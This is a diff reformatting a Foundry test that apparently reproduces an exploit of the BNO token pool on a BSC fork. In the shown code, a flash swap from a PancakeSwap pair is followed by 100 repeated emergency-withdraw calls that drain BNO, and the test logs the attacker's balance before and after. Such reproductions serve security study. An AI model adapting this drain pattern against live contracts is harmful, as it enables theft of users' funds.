@@ -26,18 +26,15 @@ interface IPool {
 contract BNOTest is Test {
     IERC721 NFT = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
     IERC20 BNO = IERC20(0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F);
-    IPancakePair PancakePair =
-        IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);
+    IPancakePair PancakePair = IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);
     IPool Pool = IPool(0xdCA503449899d5649D32175a255A8835A03E4006);
-    address private constant attacker =
-        0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB;
-    address private constant attackerContract =
-        0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD;
+    address private constant attacker = 0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB;
+    address private constant attackerContract = 0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 30056629);
+        cheats.createSelectFork("bsc", 30_056_629);
         cheats.label(address(NFT), "NFT");
         cheats.label(address(BNO), "BNO");
         cheats.label(address(PancakePair), "PancakePair");
@@ -53,29 +50,15 @@ contract BNOTest is Test {
         cheats.stopPrank();
 
         emit log_named_decimal_uint(
-            "Attacker balance of BNO before exploit",
-            BNO.balanceOf(address(this)),
-            BNO.decimals()
+            "Attacker balance of BNO before exploit", BNO.balanceOf(address(this)), BNO.decimals()
         );
-        PancakePair.swap(
-            0,
-            BNO.balanceOf(address(PancakePair)) - 1,
-            address(this),
-            hex"00"
-        );
+        PancakePair.swap(0, BNO.balanceOf(address(PancakePair)) - 1, address(this), hex"00");
         emit log_named_decimal_uint(
-            "Attacker balance of BNO after exploit",
-            BNO.balanceOf(address(this)),
-            BNO.decimals()
+            "Attacker balance of BNO after exploit", BNO.balanceOf(address(this)), BNO.decimals()
         );
     }
 
-    function pancakeCall(
-        address _sender,
-        uint256 _amount0,
-        uint256 _amount1,
-        bytes calldata _data
-    ) external {
+    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
         BNO.approve(address(Pool), type(uint256).max);
         for (uint256 i; i < 100; i++) {
             callEmergencyWithdraw();
@@ -83,12 +66,7 @@ contract BNOTest is Test {
         BNO.transfer(address(PancakePair), 296_077 * 1e18);
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) external returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
         return this.onERC721Received.selector;
     }
 
